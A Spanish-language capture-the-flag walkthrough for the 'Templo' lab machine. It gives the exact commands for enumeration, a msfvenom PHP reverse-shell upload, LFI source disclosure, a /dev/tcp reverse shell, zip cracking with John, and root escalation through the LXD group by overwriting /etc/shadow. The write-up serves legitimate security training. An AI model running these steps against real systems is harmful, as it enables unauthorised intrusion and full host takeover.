# Templo

Maquinas que vamos a utilizar **Kali Linux Templo** [https://thehackerslabs.com/templo/](https://thehackerslabs.com/templo/)

```bash
sudo arp-scan -I eth0 --localnet
```

![image.png](./imagenes/image%20259.png)

IP: 10.0.3.39

```bash
nmap -p- -sS -sV -sC --open -min-rate=5000 -n -vvv -Pn 10.0.3.39
```

![image.png](./imagenes/image%20260.png)

- Miramos a ver lo que corre por el puerto 80 en el navegador web
    
    ![image.png](./imagenes/image%20261.png)
    
    ![image.png](./imagenes/image%20262.png)
    
    No parece haber nada relevante
    
- Hacemos fuzzing web
    
    ```bash
    gobuster dir -u http://10.0.3.39/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -x php.sh,txt
    ```
    
    ![image.png](./imagenes/image%20263.png)
    
    Encontramos la siguiente URL: [**http://10.0.3.39/wow/](./imagenes/http://10.0.3.39/wow/)** con un archivo llamado **clue.txt**
    
    ![image.png](./imagenes/image%20264.png)
    
    ![image.png](./imagenes/image%20265.png)
    
    Con el siguiente texto: `Vamos al /opt` . Nos lo apuntamos ya que ahora no nos sirve por que no estamos todavía dentro de la maquina.
    
- Probamos a crearnos un diccionario apartir de las palabras de la web con la **herramienta cewl**  para utilizarlo en el **Fuzzing.**
    
    ```bash
    cewl [http://10.0.3.39](./imagenes/http://10.0.3.39/) >dic_web.txt
    ```
    
    ![image.png](./imagenes/image%20266.png)
    

- Lo probamos con gobuster
    
    ```bash
    gobuster dir -u [http://10.0.3.39](./imagenes/http://10.0.3.39/) -w /home/kali/Desktop/dic_web.txt -x php,sh,txt
    ```
    
    ![image.png](./imagenes/image%20267.png)
    

- Lo miramos en el navegador web **http://10.0.3.39/NAMARI/**
    
    ![image.png](./imagenes/image%20268.png)
    
    Nos encontramos ante un panel de subida de archivos  y el formulario inferior nos muestra el contenido de los archivo.
    
    ![image.png](./imagenes/image%20269.png)
    
- Creamos un archivo malicioso con msfvenom
    
    ```bash
    msfvenom -p php/reverse_php LHOST=10.0.3.4 LPORT=443 -f raw > virus.php
    ```
    
    ![image.png](./imagenes/image%20270.png)
    

- Lo subimos al serviros atreves del formulario
    
    ![image.png](./imagenes/image%20271.png)
    

- Ahora debemos averiguar donde deja el archivo que hemos subido.
    
    Para ello vamos a provecharnos  de que es propenso a ataques de tipo **LFI (Local File Inclusion).**
    
    ![image.png](./imagenes/image%20272.png)
    
    Vamos a intentar leer el código del archivo **index.php** para averiguar donde guarda los archivos.
    
    Introducimos la siguiente URL: `http://10.0.3.39/NAMARI/index.php?page=php://filter/convert.base64-encode/resource=index.php`
    
    Esto hace que no ejecute el código del archivo `index.php`, **sino que lo codifica en base64 y lo muestra**.
    
    ![image.png](./imagenes/image%20273.png)
    
    ![image.png](./imagenes/image%20274.png)
    
- Nos vamos a la consola y escribimos `echo “código que hemos copiado en base64” | base64 -d`  y nos mostrara el código de index.php
    
    ```bash
    echo "PD9waHAKLy8gTWFuZWpvIGRlIHN1YmlkYSBkZSBhcmNoaXZvcwppZiAoJF9TRVJWRVJbJ1JFUVVFU1RfTUVUSE9EJ10gPT09ICdQT1NUJykgewogICAgJHRhcmdldF9kaXIgPSAidXBsb2Fkcy8iOwoKICAgIC8vIE9idGllbmUgZWwgbm9tYnJlIG9yaWdpbmFsIGRlbCBhcmNoaXZvIHkgc3UgZXh0ZW5zacOzbgogICAgJG9yaWdpbmFsX25hbWUgPSBiYXNlbmFtZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsibmFtZSJdKTsKICAgICRmaWxlX2V4dGVuc2lvbiA9IHBhdGhpbmZvKCRvcmlnaW5hbF9uYW1lLCBQQVRISU5GT19FWFRFTlNJT04pOwoKCiAgICAkZmlsZV9uYW1lX3dpdGhvdXRfZXh0ZW5zaW9uID0gcGF0aGluZm8oJG9yaWdpbmFsX25hbWUsIFBBVEhJTkZPX0ZJTEVOQU1FKTsKICAgICRyb3QxM19lbmNvZGVkX25hbWUgPSBzdHJfcm90MTMoJGZpbGVfbmFtZV93aXRob3V0X2V4dGVuc2lvbik7CiAgICAkbmV3X25hbWUgPSAkcm90MTNfZW5jb2RlZF9uYW1lIC4gJy4nIC4gJGZpbGVfZXh0ZW5zaW9uOwoKICAgIC8vIENyZWEgbGEgcnV0YSBjb21wbGV0YSBwYXJhIGVsIG51ZXZvIGFyY2hpdm8KICAgICR0YXJnZXRfZmlsZSA9ICR0YXJnZXRfZGlyIC4gJG5ld19uYW1lOwoKICAgIC8vIE11ZXZlIGVsIGFyY2hpdm8gc3ViaWRvIGFsIGRpcmVjdG9yaW8gb2JqZXRpdm8gY29uIGVsIG51ZXZvIG5vbWJyZQogICAgaWYgKG1vdmVfdXBsb2FkZWRfZmlsZSgkX0ZJTEVTWyJmaWxlVG9VcGxvYWQiXVsidG1wX25hbWUiXSwgJHRhcmdldF9maWxlKSkgewogICAgICAgIC8vIE1lbnNhamUgZ2Vuw6lyaWNvIHNpbiBtb3N0cmFyIGVsIG5vbWJyZSBkZWwgYXJjaGl2bwogICAgICAgICRtZXNzYWdlID0gIkVsIGFyY2hpdm8gaGEgc2lkbyBzdWJpZG8gZXhpdG9zYW1lbnRlLiI7CiAgICAgICAgJG1lc3NhZ2VfdHlwZSA9ICJzdWNjZXNzIjsKICAgIH0gZWxzZSB7CiAgICAgICAgJG1lc3NhZ2UgPSAiSHVibyB1biBlcnJvciBzdWJpZW5kbyB0dSBhcmNoaXZvLiI7CiAgICAgICAgJG1lc3NhZ2VfdHlwZSA9ICJlcnJvciI7CiAgICB9Cn0KCgppZiAoaXNzZXQoJF9HRVRbJ3BhZ2UnXSkpIHsKICAgICRmaWxlID0gJF9HRVRbJ3BhZ2UnXTsKICAgIGluY2x1ZGUoJGZpbGUpOwp9Cj8+Cgo8IURPQ1RZUEUgaHRtbD4KPGh0bWwgbGFuZz0iZXMiPgo8aGVhZD4KICAgIDxtZXRhIGNoYXJzZXQ9IlVURi04Ij4KICAgIDx0aXRsZT5TdWJpZGEgZGUgQXJjaGl2b3MgeSBMRkk8L3RpdGxlPgogICAgPHN0eWxlPgogICAgICAgIGJvZHkgewogICAgICAgICAgICBmb250LWZhbWlseTogQXJpYWwsIHNhbnMtc2VyaWY7CiAgICAgICAgICAgIG1hcmdpbjogMDsKICAgICAgICAgICAgcGFkZGluZzogMDsKICAgICAgICAgICAgZGlzcGxheTogZmxleDsKICAgICAgICAgICAgZmxleC1kaXJlY3Rpb246IGNvbHVtbjsKICAgICAgICAgICAgYWxpZ24taXRlbXM6IGNlbnRlcjsKICAgICAgICAgICAganVzdGlmeS1jb250ZW50OiBjZW50ZXI7CiAgICAgICAgICAgIG1pbi1oZWlnaHQ6IDEwMHZoOwogICAgICAgICAgICBiYWNrZ3JvdW5kOiB1cmwoJ3VwLmpwZycpIG5vLXJlcGVhdCBjZW50ZXIgY2VudGVyIGZpeGVkOwogICAgICAgICAgICBiYWNrZ3JvdW5kLXNpemU6IGNvdmVyOwogICAgICAgIH0KCiAgICAgICAgaDIgewogICAgICAgICAgICBjb2xvcjogIzMzMzsKICAgICAgICAgICAgdGV4dC1hbGlnbjogY2VudGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOwogICAgICAgICAgICBwYWRkaW5nOiAxMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgfQoKICAgICAgICBmb3JtIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogcmdiYSgyNTUsIDI1NSwgMjU1LCAwLjgpOwogICAgICAgICAgICBwYWRkaW5nOiAyMHB4OwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA1cHg7CiAgICAgICAgICAgIGJveC1zaGFkb3c6IDAgMCAxMHB4IHJnYmEoMCwgMCwgMCwgMC4xKTsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICAgICAgd2lkdGg6IDgwJTsgLyogQW5jaG8gZGUgbG9zIGZvcm11bGFyaW9zIGFsIDgwJSBkZSBsYSBwYW50YWxsYSAqLwogICAgICAgICAgICBtYXgtd2lkdGg6IDYwMHB4OyAvKiBBbmNobyBtw6F4aW1vIGRlIGxvcyBmb3JtdWxhcmlvcyAqLwogICAgICAgIH0KCiAgICAgICAgbGFiZWwgewogICAgICAgICAgICBkaXNwbGF5OiBibG9jazsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogOHB4OwogICAgICAgICAgICBmb250LXdlaWdodDogYm9sZDsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9ImZpbGUiXSwKICAgICAgICBpbnB1dFt0eXBlPSJ0ZXh0Il0gewogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICAgICAgcGFkZGluZzogOHB4OwogICAgICAgICAgICBtYXJnaW4tYm90dG9tOiAxMHB4OwogICAgICAgICAgICBib3JkZXI6IDFweCBzb2xpZCAjY2NjOwogICAgICAgICAgICBib3JkZXItcmFkaXVzOiA0cHg7CiAgICAgICAgfQoKICAgICAgICBpbnB1dFt0eXBlPSJzdWJtaXQiXSB7CiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6ICMwMDdiZmY7CiAgICAgICAgICAgIGNvbG9yOiB3aGl0ZTsKICAgICAgICAgICAgcGFkZGluZzogMTBweCAxNXB4OwogICAgICAgICAgICBib3JkZXI6IG5vbmU7CiAgICAgICAgICAgIGJvcmRlci1yYWRpdXM6IDRweDsKICAgICAgICAgICAgY3Vyc29yOiBwb2ludGVyOwogICAgICAgICAgICB3aWR0aDogMTAwJTsKICAgICAgICB9CgogICAgICAgIGlucHV0W3R5cGU9InN1Ym1pdCJdOmhvdmVyIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogIzAwNTZiMzsKICAgICAgICB9CgogICAgICAgIC5tZXNzYWdlIHsKICAgICAgICAgICAgcGFkZGluZzogMTBweDsKICAgICAgICAgICAgbWFyZ2luLWJvdHRvbTogMjBweDsKICAgICAgICAgICAgYm9yZGVyLXJhZGl1czogNXB4OwogICAgICAgICAgICB0ZXh0LWFsaWduOiBjZW50ZXI7CiAgICAgICAgICAgIHdpZHRoOiA4MCU7IC8qIEFuY2hvIGRlbCBtZW5zYWplIGFsIDgwJSBkZSBsYSBwYW50YWxsYSAqLwogICAgICAgICAgICBtYXgtd2lkdGg6IDYwMHB4OyAvKiBBbmNobyBtw6F4aW1vIGRlbCBtZW5zYWplICovCiAgICAgICAgICAgIGJhY2tncm91bmQtY29sb3I6IHJnYmEoMjU1LCAyNTUsIDI1NSwgMC44KTsKICAgICAgICB9CgogICAgICAgIC5zdWNjZXNzIHsKICAgICAgICAgICAgYmFja2dyb3VuZC1jb2xvcjogI2Q0ZWRkYTsKICAgICAgICAgICAgY29sb3I6ICMxNTU3MjQ7CiAgICAgICAgICAgIGJvcmRlcjogMXB4IHNvbGlkICNjM2U2Y2I7CiAgICAgICAgfQoKICAgICAgICAuZXJyb3IgewogICAgICAgICAgICBiYWNrZ3JvdW5kLWNvbG9yOiAjZjhkN2RhOwogICAgICAgICAgICBjb2xvcjogIzcyMWMyNDsKICAgICAgICAgICAgYm9yZGVyOiAxcHggc29saWQgI2Y1YzZjYjsKICAgICAgICB9CiAgICA8L3N0eWxlPgo8L2hlYWQ+Cjxib2R5PgogICAgPD9waHAgaWYgKGlzc2V0KCRtZXNzYWdlKSk6ID8+CiAgICAgICAgPGRpdiBjbGFzcz0ibWVzc2FnZSA8P3BocCBlY2hvICRtZXNzYWdlX3R5cGU7ID8+Ij4KICAgICAgICAgICAgPD9waHAgZWNobyAkbWVzc2FnZTsgPz4KICAgICAgICA8L2Rpdj4KICAgIDw/cGhwIGVuZGlmOyA/PgoKICAgIDxoMj5TdWJpciBBcmNoaXZvPC9oMj4KICAgIDxmb3JtIGFjdGlvbj0iaW5kZXgucGhwIiBtZXRob2Q9InBvc3QiIGVuY3R5cGU9Im11bHRpcGFydC9mb3JtLWRhdGEiPgogICAgICAgIDxsYWJlbCBmb3I9ImZpbGVUb1VwbG9hZCI+U2VsZWNjaW9uYSB1biBhcmNoaXZvIHBhcmEgc3ViaXI6PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0iZmlsZSIgbmFtZT0iZmlsZVRvVXBsb2FkIiBpZD0iZmlsZVRvVXBsb2FkIj4KICAgICAgICA8aW5wdXQgdHlwZT0ic3VibWl0IiB2YWx1ZT0iU3ViaXIgQXJjaGl2byIgbmFtZT0ic3VibWl0Ij4KICAgIDwvZm9ybT4KCiAgICA8aDI+SW5jbHVpciBBcmNoaXZvPC9oMj4KICAgIDxmb3JtIGFjdGlvbj0iaW5kZXgucGhwIiBtZXRob2Q9ImdldCI+CiAgICAgICAgPGxhYmVsIGZvcj0icGFnZSI+QXJjaGl2byBhIGluY2x1aXI6PC9sYWJlbD4KICAgICAgICA8aW5wdXQgdHlwZT0idGV4dCIgaWQ9InBhZ2UiIG5hbWU9InBhZ2UiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIHZhbHVlPSJJbmNsdWlyIj4KICAgIDwvZm9ybT4KPC9ib2R5Pgo8L2h0bWw+Cg==” | base64 -d
    ```
    
    ![image.png](./imagenes/image%20275.png)
    
    Parece ser que los archivos se guardan en la carpeta **uploads/** y el nombre del archivo se **codifica en rot13.**
    

- Miramos en internet la codificación rot13. Yo he utilizado la web [https://www.dcode.fr/chiffre-rot-13](./imagenes/https://www.dcode.fr/chiffre-rot-13).
    
    ![image.png](./imagenes/image%20276.png)
    
    El nombre del archivo codificado seria: **ivehf.php**
    

- Nos ponemos a la escucha en el puerto 443
    
    ![image.png](./imagenes/image%20277.png)
    

- Ejecutamos la URL **http://10.0.3.39/NAMARI/uploads/ivehf.php**
    
    ![image.png](./imagenes/image%20278.png)
    
    ![image.png](./imagenes/image%20279.png)
    

- Como es una conexión hecha con msfvemon es muy inestable y tenemos que estabilizarla.
    - Estabilizamos la conexión
        - Nos ponemos a la escucha por el puerto 444 en otra terminal.
            
            ```bash
            nc -nlvp 444
            ```
            
            ![image.png](./imagenes/image%20280.png)
            
        - En la escucha 443 escribimos lo siguiente
            
            `bash -c "sh -i >& /dev/tcp/10.0.3.4/444 0>&1"`
            
            ![image.png](./imagenes/image%20281.png)
            
            ![image.png](./imagenes/image%20282.png)
            
            Ya tenemos una conexión estable.
            
        
- Hacemos un tratamiento de la TTY
    - Escribimos el siguiente comando  y veremos que adquirimos un prompt.
        
        `script /dev/null -c bash`
        
        ![image.png](./imagenes/image%2061.png)
        
    
    - Hacemos un **`CTRL+Z`**
        
        ![image.png](./imagenes/image%2062.png)
        
    
    - Escribimos a continuación.
        
        `stty raw -echo; fg`
        
        ![image.png](./imagenes/image%2063.png)
        
    
    - Escribimos `reset xterm` . Es posible que no se muestre cuando lo escribimos pero aun así lo escribimos y pulsamos Enter. Y nos aparecerá la siguiente pantalla.
        
        ![image.png](./imagenes/image%2064.png)
        
    
    - Por ultimo tenemos que exportar 2 variables. escribimos lo siguiente.
        
        `export TERM=xterm`
        
        `export SHELL=bash`
        
        ![image.png](./imagenes/image%20283.png)
        
        **Ya nos aceptaría los comandos que antes no lo hacia**.
        

- Nos movemos al directorio donde nos indicaba la pista del archivo **clue.txt**
    
    `cd /opt` 
    
    `ls -la`
    
    ![image.png](./imagenes/image%20284.png)
    
    `cd .XXX`
    
    `ls -la`
    
    ![image.png](./imagenes/image%20285.png)
    

- Levantamos un servidor web con python en la maquina victima
    
    `python3 -m http.server 8080`
    
    ![image.png](./imagenes/image%20286.png)
    

- En una terminar nos bajamos el archivo backup.zip a nuestra maquina Kali
    
    ```bash
    wget http://10.0.3.39:8080/backup.zip 
    ```
    
    ![image.png](./imagenes/image%20287.png)
    

- Intentamos descomprimirlo pero pide contraseña
    
    ```bash
    unzip backup.zip
    ```
    
    ![image.png](./imagenes/image%20288.png)
    

- Vamos a conseguir la contraseña con **John the Ripper**
    
    ```bash
    zip2john backup.zip > hash 
    ```
    
    ![image.png](./imagenes/image%20289.png)
    
    ```bash
    john --wordlist=/usr/share/wordlists/rockyou.txt hash  
    ```
    
    ![image.png](./imagenes/image%20290.png)
    
    Contraseña: **batman**
    

- Descomprimimos y miramos su contenido
    
    ```bash
    unzip backup.zip
    ```
    
    ![image.png](./imagenes/image%20291.png)
    
    ```bash
    cd backup
    ```
    
    ```bash
    ls -la
    ```
    
    ```bash
    cat Rodgar.txt 
    ```
    
    ![image.png](./imagenes/image%20292.png)
    
    Tenemos un usuario: `rodgar` y una contraseña:`6rK5£6iqF;o|8dmla859/_`
    

- En el terminal donde de la maquina Victima nos cambiamos de usuario con las nuevas credenciales.
    
    `su rodgar`
    
    `whoami`
    
    ![image.png](./imagenes/image%20293.png)
    
- He probado **sudo -l**, permisos **SUID** y no he visto que pudiera hacer nada.

- Usamos el comando **id** para mostrar información sobre el usuario actual ( **UID (User ID), GID (Group ID), Grupos secundarios).**
    
    `id`
    
    ![image.png](./imagenes/image%20294.png)
    
- Buscamos información en internet sobre el **grupo LXD**
    
    [Contenedor LXD - Escalada de privilegios de Linux -](./imagenes/https://juggernaut-sec.com/lxd-container/)
    
    ![image.png](./imagenes/image%20295.png)
    
    [https://juggernaut-sec.com/lxd-container/#Building_the_Alpine_Container_Image](./imagenes/https://juggernaut-sec.com/lxd-container/#Building_the_Alpine_Container_Image)
    
- Vamos a seguir los pasos de la web ajustándolos a nuestras necesidades.
    
    ```bash
    git clone [https://github.com/saghul/lxd-alpine-builder.git](./imagenes/https://github.com/saghul/lxd-alpine-builder.git)
    ```
    
    ```bash
    cd lxd-alpine-builder
    ```
    
    ```bash
    ./build-alpine
    ```
    
    ```bash
    sudo ./build-alpine
    ```
    
    ```bash
    mv alpine-v3.13-x86_64-20210218_0139.tar.gz alpine.tar.gz
    ```
    
    - Montamos un servidor web con Python
        
        ```bash
        python3 -m http.server 80
        ```
        
        ![image.png](./imagenes/image%20296.png)
        
    
    - En la maquina victima le pedimos descargar el archivo.
        
        `wget [http://10.0.3.4/alpine.tar.gz](./imagenes/http://10.0.3.39:8080/alpine.tar.gz)`
        
        ![image.png](./imagenes/image%20297.png)
        
    - Importamos la imagen de Alpine a LXD y comprobamos que lo ha hecho.
        
        `lxc image import alpine.tar.gz --alias alpine`
        
        `lxc image list`
        
        ![image.png](./imagenes/image%20298.png)
        
    - Iniciamos la imagen dejando todas las opciones por defecto
        
        `lxd init`
        
        ![image.png](./imagenes/image%20299.png)
        
    - Le doy un nombre al contenedor en mi caso “**contenedor**” y agrego una marca **security.privileged=true** para que el contenedor se ejecute como **root**.
        
        `lxc init alpine contenedor -c security.privileged=true`
        
        ![image.png](./imagenes/image%20300.png)
        
    - Agregamos un dispositivo de tipo `disk` al contenedor `contenedor` con el nombre `pedrocontenedor`. Creando un  punto de montaje en `/mnt/root` del sistema de archivos dentro del contenedor permitiendo que todos los archivos y subdirectorios dentro de la raíz sean accesibles.
        
        `lxc config device add contenedor pedrocontenedor disk source=/ path=/mnt/root recursive=true`
        
        ![image.png](./imagenes/image%20301.png)
        
    - Iniciamos el contenedor y lo comprobamos
        
        `lxc start contenedor`
        
        `lxc list`
        
        ![image.png](./imagenes/image%20302.png)
        
    - Iniciamos una shell dentro del contenedor
        
        `lxc exec contenedor sh`
        
        `whoami`
        
        ![image.png](./imagenes/image%20303.png)
        
        **Somos root dentro del contenedor**
        
    - Nos movemos a **/mnt/root/root** estando en el **root** de la **maquina victima**.
        
        `cd /mnt/root/root`
        
        `ls -la`
        
        ![image.png](./imagenes/image%20304.png)
        
    - Vamos a aprovechar en cambiarle la contraseña al **root**
        - Mira el fichero el contenido **/etc/shadow** de la maquina victima.
            
            `cat ../etc/shadow`
            
            ![image.png](./imagenes/image%20305.png)
            
            Copiamos el contenido.
            
        - Creamos un fichero **shadow** con nano en un terminal de mi kali y pegamos en el lo que habíamos copiado.
            
            ```bash
            nano shadow
            ```
            
            ![image.png](./imagenes/image%20306.png)
            
        
        - En otro terminal una contraseña hashseada en mi caso voy a usar la contraseña “123123”
            
            ```bash
            mkpasswd
            ```
            
            ![image.png](./imagenes/image%20307.png)
            
        - Sustituimos la contraseña de root por nuestra nueva contraseña en el archivo shadow que estamos editando.
            
            ![image.png](./imagenes/image%20308.png)
            
            ![image.png](./imagenes/image%20309.png)
            
        - Convertimos el nuevo archivo shadow a **base64 y nos lo copiamos.**
            
            ```bash
            base64 shadow 
            ```
            
            ![image.png](./imagenes/image%20310.png)
            
        - En la maquina victima salimos del contenedor y nos pasamos el contenido de shadow
            
            `exit`
            
            ![image.png](./imagenes/image%20311.png)
            
            `echo 'cm9vdDokeSRqOVQkelN5ak5kRTAwa0dlMk4wUXBQSG1zLiRvbkdHQUNCdXRHWXRVVUxiV1c4ajlkek5kU3ltU0JOLzl3Qml1b2tyODguOjE5OTQzOjA6OTk5OTk6Nzo6OgpkYWVtb246KjoxOTgzNjowOjk5OTk5Ojc6OjoKYmluOio6MTk4MzY6MDo5OTk5OTo3Ojo6CnN5czoqOjE5ODM2OjA6OTk5OTk6Nzo6OgpzeW5jOio6MTk4MzY6MDo5OTk5OTo3Ojo6CmdhbWVzOio6MTk4MzY6MDo5OTk5OTo3Ojo6Cm1hbjoqOjE5ODM2OjA6OTk5OTk6Nzo6OgpscDoqOjE5ODM2OjA6OTk5OTk6Nzo6OgptYWlsOio6MTk4MzY6MDo5OTk5OTo3Ojo6Cm5ld3M6KjoxOTgzNjowOjk5OTk5Ojc6OjoKdXVjcDoqOjE5ODM2OjA6OTk5OTk6Nzo6Ogpwcm94eToqOjE5ODM2OjA6OTk5OTk6Nzo6Ogp3d3ctZGF0YToqOjE5ODM2OjA6OTk5OTk6Nzo6OgpiYWNrdXA6KjoxOTgzNjowOjk5OTk5Ojc6OjoKbGlzdDoqOjE5ODM2OjA6OTk5OTk6Nzo6OgppcmM6KjoxOTgzNjowOjk5OTk5Ojc6OjoKX2FwdDoqOjE5ODM2OjA6OTk5OTk6Nzo6Ogpub2JvZHk6KjoxOTgzNjowOjk5OTk5Ojc6OjoKc3lzdGVtZC1uZXR3b3JrOiEqOjE5ODM2Ojo6Ojo6CnN5c3RlbWQtdGltZXN5bmM6ISo6MTk4MzY6Ojo6OjoKZGhjcGNkOiE6MTk4MzY6Ojo6OjoKbWVzc2FnZWJ1czohOjE5ODM2Ojo6Ojo6CnN5c3RlbWQtcmVzb2x2ZTohKjoxOTgzNjo6Ojo6Ogpwb2xsaW5hdGU6IToxOTgzNjo6Ojo6Ogpwb2xraXRkOiEqOjE5ODM2Ojo6Ojo6CnN5c2xvZzohOjE5ODM2Ojo6Ojo6CnV1aWRkOiE6MTk4MzY6Ojo6OjoKdGNwZHVtcDohOjE5ODM2Ojo6Ojo6CnRzczohOjE5ODM2Ojo6Ojo6CmxhbmRzY2FwZTohOjE5ODM2Ojo6Ojo6CmZ3dXBkLXJlZnJlc2g6ISo6MTk4MzY6Ojo6OjoKdXNibXV4OiE6MTk5Mzk6Ojo6OjoKc3NoZDohOjE5OTM5Ojo6Ojo6CnJvZGdhcjokeSRqOVQkZ0tEaHJkSmVlM2lDamsyMjFDODI4MSRaY2gyblRoa0NJQm1Wb0xtZmdqLnZUYnU1aTJLZFlpcEFPODNlWGVYQ3hBOjE5OTQyOjA6OTk5OTk6Nzo6OgpseGQ6IToyMDIyMjo6Ojo6Ogo=' | base64 -d > shadow`
            
            ![image.png](./imagenes/image%20312.png)
            
            `cat sahdow`
            
            ![image.png](./imagenes/image%20313.png)
            
        - Volvemos a entrar en el contenedor y nos movemos a **/mnt/root**
            
            `lxc exec contenedor sh`
            
            ![image.png](./imagenes/image%20314.png)
            
            nos movemos a **/mnt/root** y copiamos el nuevo archivo shadow sobrescribiendo el original.
            
            `cd /mnt/root`
            
            `mv ./home/rodgar/shadow ./etc/`
            
            ![image.png](./imagenes/image%20315.png)
            
        - Salimos del contenedor y nos hacemos root
            
            `exit`
            
            `su root`
            
            ![image.png](./imagenes/image%20316.png)
            
 